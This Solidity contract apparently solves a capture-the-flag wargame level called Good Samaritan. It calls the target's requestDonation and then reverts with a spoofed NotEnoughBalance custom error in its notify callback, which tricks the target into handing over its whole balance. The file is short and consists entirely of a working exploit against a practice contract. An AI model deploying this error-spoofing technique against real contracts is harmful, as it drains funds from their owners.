// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract HackGoodSamaritan {

    error NotEnoughBalance();

    function attack(IGoodSamaritan _goodSam) external {
        _goodSam.requestDonation();
    }

    function notify(uint256 amount) pure external {
      if(amount <= 10) {
        revert NotEnoughBalance();
      }
    }
}

